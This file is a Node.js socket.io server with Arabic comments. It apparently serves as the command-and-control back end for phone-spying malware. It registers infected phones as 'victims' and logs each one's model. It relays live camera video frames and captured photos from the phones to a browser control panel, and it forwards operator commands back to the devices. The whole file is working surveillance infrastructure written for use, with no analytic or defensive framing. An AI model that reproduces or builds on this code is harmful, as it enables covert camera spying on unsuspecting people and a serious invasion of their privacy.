const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 
});

app.get('/', (req, res) => { res.sendFile(__dirname + '/index.html'); });

io.on('connection', (socket) => {
    console.log('[-] نفق اتصال جديد: ' + socket.id);

    // استقبال التبليغ من الهاتف وإرساله للوحة
    socket.on('victim_online', (data) => {
        console.log('[!] تبليغ من ضحية: ' + data.model);
        // نستخدم io.emit لإرسالها لجميع المتصفحات المفتوحة
        io.emit('new_victim_alert', { id: socket.id, model: data.model });
    });

    // تمرير البث الحي
    socket.on('video_frame', (frame) => {
        socket.broadcast.emit('display_frame', { frame: frame });
    });

    // تمرير الصور الملتقطة
    socket.on('photo_captured', (img) => {
        socket.broadcast.emit('display_photo', { img: img });
    });

    // استقبال الأوامر من اللوحة وتوجيهها للهاتف
    socket.on('admin_command', (data) => {
        console.log('[>] أمر مرسل: ' + data.command);
        io.emit(data.command, data); 
    });
});

const PORT = process.env.PORT || 8080;
http.listen(PORT, '0.0.0.0', () => console.log('🚀 Server running on port ' + PORT));
